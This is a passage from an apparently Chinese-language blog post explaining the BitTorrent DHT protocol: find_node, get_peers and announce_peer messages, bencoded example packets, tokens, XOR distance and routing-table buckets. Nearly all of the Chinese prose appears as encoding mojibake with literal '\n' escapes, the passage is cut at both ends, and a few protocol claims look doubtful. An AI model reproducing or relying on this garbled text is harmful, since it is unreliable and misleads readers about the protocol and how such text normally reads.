‡èŠ‚ç‚¹çš„èŠ‚ç‚¹åˆ—è¡¨Kæ…)\n\t\n```\nå‚æ•°: {\"id\" : \"<querying nodes id>\", \"target\" : \"<id of target node>\"}\nå›å¤: {\"id\" : \"<queried nodes id>\", \"nodes\" : \"<compact node info>\"}\n```\n\nè¿™é‡Œè¦æ˜ç¡®3ä¸ªæ¦‚å¿µ:\n\t\n1. è¯·æ±‚æ–¹çš„id: å‘èµ·è¿™ä¸ªDHTèŠ‚ç‚¹å¯»å€çš„èŠ‚ç‚¹è‡ªèº«çš„IDï¼Œå¯ä»¥ç±»æ¯”DNSæŸ¥è¯¢ä¸­çš„å®¢æˆ·ç«¯\n2. ç›®æ ‡target id: éœ€è¦æŸ¥è¯¢çš„ç›®æ ‡IDå·ï¼Œå¯ä»¥ç±»æ¯”äºDNSæŸ¥è¯¢ä¸­çš„URLï¼Œè¿™ä¸ªIDåœ¨æ•´ä¸ªé€’å½’æŸ¥è¯¢ä¸­æ˜¯ä¸€ç›´ä¸å˜çš„\n3. è¢«è¯·æ±‚èŠ‚ç‚¹çš„id: åœ¨èŠ‚ç‚¹çš„é€’å½’æŸ¥è¯¢ä¸­ï¼Œè¯·æ±‚æ–¹ç”±è¿œåŠè¿‘ä¸æ–­è¯¢é—®æ•´ä¸ªé“¾è·¯ä¸Šçš„èŠ‚ç‚¹ï¼Œæ²¿é€”çš„æ¯ä¸ªèŠ‚ç‚¹åœ¨è¿”å›æ—¶éƒ½è¦å¸¦ä¸Šè‡ªå·±çš„idå·\n\n\t\n+ <font color=\"red\"> get_peers: è·å– infohash çš„ peers</font>\n\n\n1. get_peers è¯·æ±‚åŒ…å« 2 ä¸ªå‚æ•°(idè¯·æ±‚èŠ‚ç‚¹IDï¼Œinfo_hashä»£è¡¨torrentæ–‡ä»¶çš„infohashï¼Œinfohashä¸ºç§å­æ–‡ä»¶çš„SHA1å“ˆå¸Œå€¼ï¼Œä¹Ÿå°±æ˜¯ç£åŠ›é“¾æ¥çš„btihå€¼)\n\n2. response get_peer: \n\n\t1) å¦‚æœè¢«è¯·æ±‚çš„èŠ‚ç‚¹æœ‰å¯¹åº” info_hash çš„ peersï¼Œä»–å°†è¿”å›ä¸€ä¸ªå…³é”®å­— valuesï¼Œè¿™æ˜¯ä¸€ä¸ªåˆ—è¡¨ç±»å‹çš„å­—ç¬¦ä¸²ã€‚æ¯ä¸€ä¸ªå­—ç¬¦ä¸²åŒ…å«äº† \"CompactIP-address/portinfo\" æ ¼å¼çš„ peers ä¿¡æ¯(å³å¯¹åº”çš„æœºå™¨ip/portä¿¡æ¯)(peerçš„infoä¿¡æ¯å’ŒDHTèŠ‚ç‚¹çš„infoä¿¡æ¯æ˜¯ä¸€æ ·çš„)\n\n\t2) å¦‚æœè¢«è¯·æ±‚çš„èŠ‚ç‚¹æ²¡æœ‰è¿™ä¸ª infohash çš„ peersï¼Œé‚£ä¹ˆä»–å°†è¿”å›å…³é”®å­— nodes(éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¯¥èŠ‚ç‚¹æ²¡æœ‰å¯¹åº”çš„infohashä¿¡æ¯ï¼Œè€Œåªæ˜¯è¿”å›äº†nodesï¼Œåˆ™è¯·æ±‚æ–¹ä¼šè®¤ä¸ºè¯¥èŠ‚ç‚¹æ˜¯ä¸€ä¸ª\"å¯ç–‘èŠ‚ç‚¹\"ï¼Œåˆ™ä¼šä»è‡ªå·±çš„è·¯ç”±è¡¨Kæ…ä¸­åˆ é™¤è¯¥èŠ‚ç‚¹)ï¼Œè¿™ä¸ªå…³é”®å­—åŒ…å«äº†è¢«è¯·æ±‚èŠ‚ç‚¹çš„è·¯ç”±è¡¨ä¸­ç¦» info_hash æœ€è¿‘çš„ K ä¸ªèŠ‚ç‚¹(æˆ‘è¿™é‡Œæ²¡æœ‰è¯¥èŠ‚ç‚¹ï¼Œå»åˆ«çš„èŠ‚ç‚¹è¯•è¯•è¿æ°”)ï¼Œä½¿ç”¨ \"Compactnodeinfo\" æ ¼å¼å›å¤ã€‚åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œå…³é”®å­— token éƒ½å°†è¢«è¿”å›ã€‚token å…³é”®å­—åœ¨ä»Šåçš„ annouce_peer è¯·æ±‚ä¸­å¿…é¡»è¦æºå¸¦ã€‚token æ˜¯ä¸€ä¸ªçŸ­çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²\n\n\t\n```\nå‚æ•°: {\"id\" : \"<querying nodes id>\", \"info_hash\" : \"<20-byte infohash of target torrent>\"}\n\t\nå›å¤: \n{\"id\" : \"<queried nodes id>\", \"token\" :\"<opaque write token>\", \"values\" : [\"<peer 1 info string>\", \"<peer 2 info string>\"]}\næˆ–: \t\n{\"id\" : \"<queried nodes id>\", \"token\" :\"<opaque write token>\", \"nodes\" : \"<compact node info>\"}\n```\n\n+ <font color=\"red\"> announce_peer: è¿™ä¸ªè¯·æ±‚ç”¨æ¥è¡¨æ˜å‘å‡º announce_peer è¯·æ±‚çš„èŠ‚ç‚¹ï¼Œæ­£åœ¨æŸä¸ªç«¯å£ä¸‹è½½ torrent æ–‡ä»¶</font>\n\nannounce_peer åŒ…å« 4 ä¸ªå‚æ•°\n\t\n```\n1. ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ id: åŒ…å«äº†è¯·æ±‚èŠ‚ç‚¹çš„ ID\n2. ç¬¬äºŒä¸ªå‚æ•°æ˜¯ info_hash: åŒ…å«äº† torrent æ–‡ä»¶çš„ infohash\n3. ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ port: åŒ…å«äº†æ•´å‹çš„ç«¯å£å·ï¼Œè¡¨æ˜ peer åœ¨å“ªä¸ªç«¯å£ä¸‹è½½\n4. ç¬¬å››ä¸ªå‚æ•°æ•°æ˜¯ token: è¿™æ˜¯åœ¨ä¹‹å‰çš„ get_peers è¯·æ±‚ä¸­æ”¶åˆ°çš„å›å¤ä¸­åŒ…å«çš„ã€‚æ”¶åˆ° announce_peer è¯·æ±‚çš„èŠ‚ç‚¹å¿…é¡»æ£€æŸ¥è¿™ä¸ª token ä¸ä¹‹å‰æˆ‘ä»¬å›å¤ç»™è¿™ä¸ªèŠ‚ç‚¹ get_peers çš„ token æ˜¯å¦ç›¸åŒ(ä¹Ÿå°±è¯´ï¼Œæ‰€æœ‰ä¸‹è½½è€…/å‘å¸ƒè€…éƒ½è¦å‚ä¸æ£€æµ‹æ–°åŠ å…¥çš„å‘å¸ƒè€…æ˜¯å¦ä¼ªé€ äº†è¯¥èµ„æºï¼Œä½†æ˜¯è¿™ä¸ªæœºåˆ¶æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœæœ€å¼€å§‹çš„é‚£ä¸ªå‘å¸ƒè€…å°±ä¼ªé€ ï¼Œåˆ™æ•´æ¡é“¾è·¯éƒ½æ˜¯ä¸€ä¸ªä¼ªé€ çš„é”™çš„èµ„æºinfohashä¿¡æ¯äº†)\nå¦‚æœç›¸åŒï¼Œé‚£ä¹ˆè¢«è¯·æ±‚çš„èŠ‚ç‚¹å°†è®°å½•å‘é€ announce_peer èŠ‚ç‚¹çš„ IP å’Œè¯·æ±‚ä¸­åŒ…å«çš„ port ç«¯å£å·åœ¨ peer è”ç³»ä¿¡æ¯ä¸­å¯¹åº”çš„ infohash ä¸‹ï¼Œè¿™æ„å‘³ç€ä¸€ä¸ªä¸€ä¸ªäº‹å®: å½“å‰è¿™ä¸ªèµ„æºæœ‰ä¸€ä¸ªæ–°çš„peeræä¾›è€…äº†ï¼Œä¸‹ä¸€æ¬¡æœ‰å…¶ä»–èŠ‚ç‚¹å¸Œæœ›æˆ–è€…è¿™ä¸ªèµ„æºçš„æ—¶å€™ï¼Œä¼šæŠŠè¿™ä¸ªæ–°çš„(å‰ä¸€æ¬¡è¯·æ±‚ä¸‹è½½èµ„æºçš„èŠ‚ç‚¹)ä¹Ÿå½“ä½œä¸€ä¸ªpeerè¿”å›ç»™è¯·æ±‚è€…ï¼Œè¿™æ ·ï¼Œèµ„æºçš„æä¾›è€…å°±è¶Šæ¥è¶Šå¤šï¼Œèµ„æºå…±äº«é€Ÿåº¦å°±è¶Šæ¥è¶Šå¿«\n```\n\nä¸€ä¸ªpeeræ­£åœ¨ä¸‹è½½æŸä¸ªèµ„æºï¼Œæ„å‘³ç€è¯¥peeræœ‰èƒ½å¤Ÿè®¿é—®åˆ°è¯¥èµ„æºçš„æ¸ é“ï¼Œä¸”è¯¥peeræœ¬åœ°æ˜¯æœ‰è¿™ä»½èµ„æºçš„å…¨éƒ¨æˆ–éƒ¨åˆ†æ‹·è´çš„ï¼Œå®ƒéœ€è¦å‘DHTç½‘ç»œå¹¿æ’­announceæ¶ˆæ¯ï¼Œå‘Šè¯‰å…¶ä»–èŠ‚ç‚¹è¿™ä¸ªèµ„æºçš„ä¸‹è½½åœ°å€\n\t\n```\narguments:  {\"id\" : \"<querying nodes id>\",\n\"implied_port\": <0 or 1>,\n\"info_hash\" : \"<20-byte infohash of target torrent>\",\n\"port\" : <port number>,\n\"token\" : \"<opaque token>\"}\n\t\nresponse: {\"id\" : \"<queried nodes id>\"}\n```\n\næŠ¥æ–‡åŒ…ä¾‹å­ Example Packets \n\t\n```\nannounce_peers Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"announce_peer\", \"a\": {\"id\":\"abcdefghij0123456789\", \"implied_port\": 1, \"info_hash\":\"mnopqrstuvwxyz123456\", \"port\": 6881, \"token\": \"aoeusnth\"}}\nbencoded = d1:ad2:id20:abcdefghij01234567899:info_hash20:<br />\nmnopqrstuvwxyz1234564:porti6881e5:token8:aoeusnthe1:q13:announce_peer1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"mnopqrstuvwxyz123456\"}}\nbencoded = d1:rd2:id20:mnopqrstuvwxyz123456e1:t2:aa1:y1:re\n```\n\n### 0x3: å›å¤ Responses\n\nå›å¤ Responsesçš„åŒ…å·²ç»åœ¨ä¸Šé¢çš„Queryé‡Œè¯´æ˜äº†\n\n\n### 0x4: é”™è¯¯ Errors\n\né”™è¯¯åŒ…ä¾‹å­ Example Error Packets\n\n```\ngeneric error = {\"t\":\"aa\", \"y\":\"e\", \"e\":[201, \"A Generic Error Ocurred\"]}\nbencoded = d1:eli201e23:A Generic Error Ocurrede1:t2:aa1:y1:ee\n```\n\n\n# 3. BitTorrentåè®®\n\nBitTorrent ä½¿ç”¨\"åˆ†å¸ƒå¼å“ˆå¸Œè¡¨\"(DHT)æ¥ä¸ºæ—  tracker çš„ç§å­(torrents)å­˜å‚¨ peer ä¹‹é—´çš„è”ç³»ä¿¡æ¯ã€‚è¿™æ ·æ¯ä¸ª peer éƒ½æˆäº† trackerã€‚è¿™ä¸ªåè®®åŸºäº Kademila ç½‘ç»œå¹¶ä¸”åœ¨ UDP ä¸Šå®ç°\n\n\n```\n1. \"peer\" æ˜¯åœ¨ä¸€ä¸ª TCP ç«¯å£ä¸Šç›‘å¬çš„å®¢æˆ·ç«¯/æœåŠ¡å™¨ï¼Œå®ƒå®ç°äº† BitTorrent åè®® \n2. \"èŠ‚ç‚¹\" æ˜¯åœ¨ä¸€ä¸ª UDP ç«¯å£ä¸Šç›‘å¬çš„å®¢æˆ·ç«¯/æœåŠ¡å™¨ï¼Œå®ƒå®ç°äº† DHT(åˆ†å¸ƒå¼å“ˆå¸Œè¡¨) åè®® \nDHT ç”±èŠ‚ç‚¹ç»„æˆï¼Œå®ƒå­˜å‚¨äº† peer çš„ä½ç½®ã€‚BitTorrent å®¢æˆ·ç«¯åŒ…å«ä¸€ä¸ª DHT èŠ‚ç‚¹ï¼Œè¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥è”ç³» DHT ä¸­å…¶ä»–èŠ‚ç‚¹ï¼Œä»è€Œå¾—åˆ° peer çš„ä½ç½®ï¼Œè¿›è€Œé€šè¿‡ BitTorrent åè®®ä¸‹è½½ \n```\n\n\næ¯ä¸ªèŠ‚ç‚¹æœ‰ä¸€ä¸ªå…¨å±€å”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œä½œä¸º \"node ID\"ã€‚èŠ‚ç‚¹ ID æ˜¯ä¸€ä¸ªéšæœºé€‰æ‹©çš„ 160bit(20å­—èŠ‚) ç©ºé—´ï¼ŒBitTorrent infohash ä¹Ÿä½¿ç”¨è¿™æ ·çš„ 160bit ç©ºé—´ã€‚\"è·ç¦»\"ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªèŠ‚ç‚¹ ID ä¹‹é—´æˆ–è€…èŠ‚ç‚¹ ID å’Œ infohash ä¹‹é—´çš„\"è¿œè¿‘\"(èŠ‚ç‚¹å’ŒèŠ‚ç‚¹ã€èŠ‚ç‚¹å’Œæ–‡ä»¶ä¹‹é—´çš„è·ç¦»)ã€‚èŠ‚ç‚¹å¿…é¡»ç»´æŠ¤ä¸€ä¸ªè·¯ç”±è¡¨ï¼Œè·¯ç”±è¡¨ä¸­å«æœ‰ä¸€éƒ¨åˆ†å…¶å®ƒèŠ‚ç‚¹çš„è”ç³»ä¿¡æ¯ã€‚å…¶å®ƒèŠ‚ç‚¹è·ç¦»è‡ªå·±è¶Šè¿‘æ—¶ï¼Œè·¯ç”±è¡¨ä¿¡æ¯è¶Šè¯¦ç»†ã€‚å› æ­¤æ¯ä¸ªèŠ‚ç‚¹éƒ½çŸ¥é“ DHT ä¸­ç¦»è‡ªå·±å¾ˆ\"è¿‘\"çš„èŠ‚ç‚¹çš„è”ç³»ä¿¡æ¯ï¼Œè€Œç¦»è‡ªå·±éå¸¸è¿œçš„ ID çš„è”ç³»ä¿¡æ¯å´çŸ¥é“çš„å¾ˆå°‘ \nåœ¨ Kademlia ç½‘ç»œä¸­ï¼Œè·ç¦»æ˜¯é€šè¿‡å¼‚æˆ–(XOR)è®¡ç®—çš„ï¼Œç»“æœä¸ºæ— ç¬¦å·æ•´æ•°ã€‚distance(A, B) = |A xor B|ï¼Œå€¼è¶Šå°è¡¨ç¤ºè¶Šè¿‘\n\n\n\n1. å½“èŠ‚ç‚¹è¦ä¸º torrent(ç§å­æ–‡ä»¶) å¯»æ‰¾ peer(ä¿å­˜äº†ç›®æ ‡èµ„æºçš„IP) æ—¶ï¼Œå®ƒå°†è‡ªå·±è·¯ç”±è¡¨ä¸­çš„èŠ‚ç‚¹ ID å’Œ torrent çš„ infohash(èµ„æºHASH) è¿›è¡Œ\"è·ç¦»å¯¹æ¯”\"(èŠ‚ç‚¹å’Œç›®æ ‡æ–‡ä»¶çš„è·ç¦»)ï¼Œç„¶åå‘è·¯ç”±è¡¨ä¸­ç¦» infohash æœ€è¿‘çš„èŠ‚ç‚¹å‘é€è¯·æ±‚ï¼Œé—®å®ƒä»¬æ­£åœ¨ä¸‹è½½è¿™ä¸ª torrent çš„ peer çš„è”ç³»ä¿¡æ¯\n\n2. å› ä¸ºèµ„æºHASHå’ŒèŠ‚ç‚¹HASHéƒ½å…±ç”¨ä¸€å¥—20bytesçš„å‘½åç©ºé—´ï¼Œæ‰€ä»¥DHTèŠ‚ç‚¹å……å½“äº†peerèŠ‚ç‚¹çš„\"ä»£ç†\"çš„å·¥ä½œï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥å‘peerèŠ‚ç‚¹å‘èµ·èµ„æºè·å–è¯·æ±‚(å³ä½¿è¿™ä¸ªpeerèŠ‚ç‚¹ç¡®å®å­˜å‚¨äº†æˆ‘ä»¬çš„ç›®æ ‡èµ„æº)ï¼Œå› ä¸ºpeerèŠ‚ç‚¹æœ¬èº«ä¸å…·å¤‡å¤„ç†P2P request/responseèƒ½åŠ›çš„ï¼Œæˆ‘ä»¬éœ€è¦å€ŸåŠ©DHTçš„èƒ½åŠ›ï¼Œè®©DHTå‘Šè¯‰æˆ‘ä»¬å“ªä¸ªpeerèŠ‚ç‚¹ä¿å­˜äº†æˆ‘ä»¬æƒ³è¦çš„èµ„æºæˆ–è€…å“ªä¸ªDHTèŠ‚ç‚¹å¯èƒ½çŸ¥é“ä»è€Œé€’å½’åœ°ç»§ç»­å»é—®é‚£ä¸ªDHTç½‘ç»œ\n\n3. å¦‚æœä¸€ä¸ªè¢«è”ç³»çš„èŠ‚ç‚¹çŸ¥é“ä¸‹è½½è¿™ä¸ª torrent çš„ peer ä¿¡æ¯ï¼Œé‚£ä¸ª peer çš„è”ç³»ä¿¡æ¯å°†è¢«å›å¤ç»™å½“å‰èŠ‚ç‚¹ã€‚å¦åˆ™ï¼Œé‚£ä¸ªè¢«è”ç³»çš„èŠ‚ç‚¹åˆ™å¿…é¡»å›å¤åœ¨å®ƒçš„è·¯ç”±è¡¨ä¸­ç¦»è¯¥ torrent çš„ infohash æœ€è¿‘çš„èŠ‚ç‚¹çš„è”ç³»ä¿¡æ¯ï¼Œ(`get_peers`)\n\n4. æœ€åˆçš„èŠ‚ç‚¹é‡å¤åœ°è¯·æ±‚æ¯”ç›®æ ‡ infohash æ›´è¿‘çš„èŠ‚ç‚¹ï¼Œç›´åˆ°ä¸èƒ½å†æ‰¾åˆ°æ›´è¿‘çš„èŠ‚ç‚¹ä¸ºæ­¢\n\n5. æŸ¥è¯¢å®Œäº†ä¹‹åï¼Œå®¢æˆ·ç«¯æŠŠè‡ªå·±ä½œä¸ºä¸€ä¸ª peer æ’å…¥åˆ°æ‰€æœ‰å›å¤èŠ‚ç‚¹ä¸­ç¦»ç§å­æœ€è¿‘çš„é‚£ä¸ªèŠ‚ç‚¹ä¸­ï¼Œè¿™ä¸€æ­¥èƒŒåçš„å«ä¹‰æ˜¯: æˆ‘ä¹‹å‰æ˜¯è¯·æ±‚è¿™ä¸ªèµ„æºçš„äººï¼Œæˆ‘ä»¬ç°åœ¨è·å–åˆ°èµ„æºäº†ï¼Œæˆ‘åœ¨ä¸‹è½½è¿™ä¸ªæ–‡ä»¶çš„åŒæ—¶ï¼Œæˆ‘ä¹Ÿè¦å……å½“ä¸€ä¸ªæ–°çš„peeræ¥å‘å…¶ä»–çš„å®¢æˆ·ç«¯è´¡çŒ®è‡ªå·±çš„æ–‡ä»¶å…±äº«ï¼Œè¿™æ ·ï¼Œå½“å¦å¤–çš„å…¶ä»–å®¢æˆ·ç«¯åœ¨å‘èµ·æ–°çš„è¯·æ±‚çš„æ—¶å€™ï¼ŒDHTèŠ‚ç‚¹å°±æœ‰å¯èƒ½æŠŠå½“å‰å®¢æˆ·ç«¯å¯¹åº”çš„peerè¿”å›ç»™æ–°çš„è¯·æ±‚æ–¹ï¼Œè¿™æ ·ä¸æ–­å‘å±•ä¸‹å»ï¼Œè¿™ä¸ªèµ„æºçš„çƒ­åº¦å°±è¶Šæ¥è¶Šçƒ­ï¼Œä¸‹è½½é€Ÿåº¦ä¹Ÿè¶Šæ¥è¶Šå¿«(`announce_peer`)\n\n6. è¯·æ±‚ peer çš„è¿”å›å€¼åŒ…å«ä¸€ä¸ªä¸é€æ˜çš„å€¼ï¼Œç§°ä¹‹ä¸º\"ä»¤ç‰Œ(token)\"\n\n7. å¦‚æœä¸€ä¸ªèŠ‚ç‚¹å®£å¸ƒå®ƒæ‰€æ§åˆ¶çš„ peer æ­£åœ¨ä¸‹è½½ä¸€ä¸ªç§å­(å³è¯¥èŠ‚ç‚¹æ‹¥æœ‰è¯¥æ–‡ä»¶èµ„æº)ï¼Œå®ƒå¿…é¡»åœ¨å›å¤è¯·æ±‚èŠ‚ç‚¹çš„åŒæ—¶ï¼Œé™„åŠ ä¸Šå¯¹æ–¹å‘æˆ‘ä»¬å‘é€çš„æœ€è¿‘çš„\"ä»¤ç‰Œ(token)\"ã€‚è¿™æ ·å½“ä¸€ä¸ªèŠ‚ç‚¹è¯•å›¾\"å®£å¸ƒ\"æ­£åœ¨ä¸‹è½½ä¸€ä¸ªç§å­æ—¶ï¼Œè¢«è¯·æ±‚çš„èŠ‚ç‚¹æ ¸å¯¹ä»¤ç‰Œå’Œå‘å‡ºè¯·æ±‚çš„èŠ‚ç‚¹çš„ IP åœ°å€ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢æ¶æ„çš„ä¸»æœºç™»è®°å…¶å®ƒä¸»æœºçš„ç§å­ã€‚ç”±äºä»¤ç‰Œä»…ä»…ç”±è¯·æ±‚èŠ‚ç‚¹è¿”å›ç»™æ”¶åˆ°ä»¤ç‰Œçš„åŒä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ‰€ä»¥æ²¡æœ‰è§„å®šä»–çš„å…·ä½“å®ç°ã€‚ä½†æ˜¯ä»¤ç‰Œå¿…é¡»åœ¨ä¸€ä¸ªè§„å®šçš„æ—¶é—´å†…è¢«æ¥å—ï¼Œè¶…æ—¶åä»¤ç‰Œåˆ™å¤±æ•ˆã€‚åœ¨ BitTorrent çš„å®ç°ä¸­ï¼Œtoken æ˜¯åœ¨ IP åœ°å€åé¢è¿æ¥ä¸€ä¸ª secret(é€šå¸¸æ˜¯ä¸€ä¸ªéšæœºæ•°)ï¼Œè¿™ä¸ª secret æ¯äº”åˆ†é’Ÿæ”¹å˜ä¸€æ¬¡ï¼Œå…¶ä¸­ token åœ¨ååˆ†é’Ÿä»¥å†…æ˜¯å¯æ¥å—çš„\n\n\nè¿™ç§æ¡æ‰‹éªŒè¯çš„åŸç†æ˜¯:\n\n> è¯·æ±‚æ–¹ç”Ÿæˆä¸€ä¸ªéšæœºå€¼ï¼Œè·Ÿç€æˆ‘çš„è¯·æ±‚å‘ç»™è¢«è¯·æ±‚æ–¹ï¼Œè¢«è¯·æ±‚æ–¹å›å¤çš„æ—¶å€™è¦å¸¦ä¸Šè¿™ä¸ªéšæœºå€¼ï¼Œé‚£è¯·æ±‚æ–¹å°±çŸ¥é“ï¼Œä½ æ˜¯æˆ‘åˆšæ‰æƒ³è¯·æ±‚çš„é‚£ä¸ªäºº\n\n### 0x1: è·¯ç”±è¡¨ Routing Table\n\n\n1. æ¯ä¸ªèŠ‚ç‚¹ç»´æŠ¤ä¸€ä¸ªè·¯ç”±è¡¨ä¿å­˜å·²çŸ¥çš„å¥½èŠ‚ç‚¹ã€‚è·¯ç”±è¡¨ä¸­çš„èŠ‚ç‚¹æ˜¯ç”¨æ¥ä½œä¸ºåœ¨ DHT ä¸­è¯·æ±‚çš„èµ·å§‹ç‚¹ã€‚è·¯ç”±è¡¨ä¸­çš„èŠ‚ç‚¹æ˜¯åœ¨ä¸æ–­çš„å‘å…¶ä»–èŠ‚ç‚¹è¯·æ±‚è¿‡ç¨‹ä¸­ï¼Œå¯¹æ–¹èŠ‚ç‚¹å›å¤çš„ã€‚å³DHTä¸­çš„Kæ¡¶ä¸­çš„èŠ‚ç‚¹ï¼Œå½“æˆ‘ä»¬è¯·æ±‚ä¸€ä¸ªç›®æ ‡èµ„æºçš„æ—¶å€™ï¼Œæˆ‘ä»¬æ ¹æ®HASH XORä»è‡ªå·±çš„Kæ¡¶ä¸­é€‰æ‹©æœ€æœ‰å¯èƒ½çŸ¥é“è¯¥èµ„æºçš„èŠ‚ç‚¹å‘èµ·è¯·æ±‚ï¼Œè€Œè¢«è¯·æ±‚çš„èŠ‚ç‚¹ä¹Ÿä¸ä¸€å®šçŸ¥é“ç›®æ ‡èµ„æºæ‰€åœ¨çš„peerï¼Œè¿™ä¸ªæ—¶å€™è¢«è¯·æ±‚æ–¹ä¼šè¿”å›ä¸€ä¸ªæ–°çš„\"å®ƒè®¤ä¸ºå¯èƒ½çŸ¥é“è¿™ä¸ªpeerçš„èŠ‚ç‚¹\"ï¼Œè¯·æ±‚æ–¹æ”¶åˆ°è¿™ä¸ªæ–°çš„èŠ‚ç‚¹åï¼Œä¼šæŠŠè¿™ä¸ªèŠ‚ç‚¹ä¿å­˜è¿›è‡ªå·±çš„Kæ¡¶å†…ï¼Œç„¶åç»§ç»­å‘èµ·è¯·æ±‚ï¼Œç›´åˆ°æ‰¾åˆ°ç›®æ ‡èµ„æºæ‰€åœ¨çš„peerä¸ºæ­¢\n\n2. å¹¶ä¸æ˜¯æˆ‘ä»¬åœ¨è¯·æ±‚è¿‡ç¨‹ä¸­æ”¶åˆ°çš„èŠ‚ç‚¹éƒ½æ˜¯å¹³ç­‰çš„ï¼Œæœ‰çš„èŠ‚ç‚¹æ˜¯å¥½çš„ï¼Œè€Œå¦ä¸€äº›åˆ™ä¸æ˜¯ã€‚è®¸å¤šä½¿ç”¨ DHT åè®®çš„èŠ‚ç‚¹éƒ½å¯ä»¥å‘é€è¯·æ±‚å¹¶æ¥æ”¶å›å¤ï¼Œä½†æ˜¯ä¸èƒ½ä¸»åŠ¨å›å¤å…¶ä»–èŠ‚ç‚¹çš„è¯·æ±‚ï¼Œè¿™ç§èŠ‚ç‚¹è¢«ç§°ä¹‹ä¸º\"åèŠ‚ç‚¹\"\n\n3. èŠ‚ç‚¹çš„è·¯ç”±è¡¨åªåŒ…å«å·²çŸ¥çš„å¥½èŠ‚ç‚¹ï¼Œè¿™å¾ˆé‡è¦ã€‚å¥½èŠ‚ç‚¹æ˜¯æŒ‡åœ¨è¿‡å»çš„ 15 åˆ†é’Ÿä»¥å†…ï¼Œæ›¾ç»å¯¹æˆ‘ä»¬çš„æŸä¸€ä¸ªè¯·æ±‚ç»™å‡ºè¿‡å›å¤çš„èŠ‚ç‚¹(å­˜æ´»å¥½èŠ‚ç‚¹)ï¼Œæˆ–è€…æ›¾ç»å¯¹æˆ‘ä»¬çš„è¯·æ±‚ç»™å‡ºè¿‡ä¸€ä¸ªå›å¤(ä¸ç”¨åœ¨15åˆ†é’Ÿä»¥å†…)ï¼Œå¹¶ä¸”åœ¨è¿‡å»çš„ 15 åˆ†é’Ÿç»™æˆ‘ä»¬å‘é€è¿‡è¯·æ±‚ã€‚ä¸Šè¿°ä¸¤ç§æƒ…å†µéƒ½å¯å°†èŠ‚ç‚¹è§†ä¸ºå¥½èŠ‚ç‚¹ã€‚åœ¨ 15 åˆ†é’Ÿä¹‹åï¼Œå¯¹æ–¹æ²¡æœ‰ä¸Šè¿° 2ç§æƒ…å†µå‘ç”Ÿï¼Œè¿™ä¸ªèŠ‚ç‚¹å°†å˜ä¸ºå¯ç–‘çš„ã€‚å½“èŠ‚ç‚¹ä¸èƒ½ç»™æˆ‘ä»¬çš„ä¸€ç³»åˆ—è¯·æ±‚ç»™å‡ºå›å¤æ—¶ï¼Œè¿™ä¸ªèŠ‚ç‚¹å°†å˜ä¸ºåçš„ã€‚ç›¸æ¯”é‚£äº›æœªçŸ¥çŠ¶æ€çš„èŠ‚ç‚¹ï¼Œå·²çŸ¥çš„å¥½èŠ‚ç‚¹ä¼šè¢«ç»™äºæ›´é«˜çš„ä¼˜å…ˆçº§ã€‚(çœ‹æºç ç¡®å®æ˜¯è¿™æ ·çš„)\n\n\t> è¿™å°±åè¿‡æ¥å‘Šè¯‰æˆ‘ä»¬ï¼Œå¦‚æœæˆ‘ä»¬è¦åšDHTå—…æ¢ï¼Œæˆ‘ä»¬çš„å—…æ¢å™¨é™¤äº†è¦èƒ½å¤Ÿå‘å‡ºFIND_NODEè¯·æ±‚åŠæ¥æ”¶è¿”å›ä¹‹å¤–ï¼Œè¿˜éœ€è¦èƒ½å¤Ÿå“åº”å…¶ä»–èŠ‚ç‚¹å‘æ¥çš„è¯·æ±‚(`get_peers/announce_peer`)ï¼Œè¿™æ ·æ‰ä¸ä¼šè¢«å…¶ä»–èŠ‚ç‚¹åˆ—å…¥\"å¯ç–‘\"ç”šè‡³\"åèŠ‚ç‚¹\"åˆ—è¡¨ä¸­\n\n4. è·¯ç”±è¡¨è¦†ç›–ä» 0 åˆ° 2^160 å…¨éƒ¨çš„èŠ‚ç‚¹ ID ç©ºé—´ã€‚è·¯ç”±è¡¨åˆè¢«åˆ’åˆ†ä¸ºæ¡¶(bucket)ï¼Œæ¯ä¸ªæ¡¶åŒ…å«ä¸€éƒ¨åˆ†çš„ ID ç©ºé—´ã€‚ç©ºçš„è·¯ç”±è¡¨åªæœ‰ä¸€ä¸ªæ¡¶ï¼Œå®ƒçš„ ID èŒƒå›´ä» min=0 åˆ° max=2^160ã€‚å½“ ID ä¸º N çš„èŠ‚ç‚¹æ’å…¥åˆ°è¡¨ä¸­æ—¶ï¼Œå®ƒå°†è¢«æ”¾åˆ° ID èŒƒå›´åœ¨ min <= N < max çš„ æ¡¶ ä¸­\n\n5. ç©ºçš„è·¯ç”±è¡¨åªæœ‰ä¸€ä¸ªæ¡¶ï¼Œæ‰€ä»¥æ‰€æœ‰çš„èŠ‚ç‚¹éƒ½å°†è¢«æ”¾åˆ°è¿™ä¸ªæ¡¶ä¸­ã€‚æ¯ä¸ªæ¡¶æœ€å¤šåªèƒ½ä¿å­˜ K ä¸ªèŠ‚ç‚¹ï¼Œå½“å‰ K=8ã€‚å½“ä¸€ä¸ªæ¡¶æ”¾æ»¡äº†å¥½èŠ‚ç‚¹ä¹‹åï¼Œå°†ä¸å†å…è®¸æ–°çš„èŠ‚ç‚¹åŠ å…¥ï¼Œé™¤éæˆ‘ä»¬è‡ªèº«çš„èŠ‚ç‚¹ ID åœ¨è¿™ä¸ªæ¡¶çš„èŒƒå›´å†…ã€‚åœ¨è¿™æ ·çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæ¡¶å°†è¢«åˆ†è£‚ä¸º 2 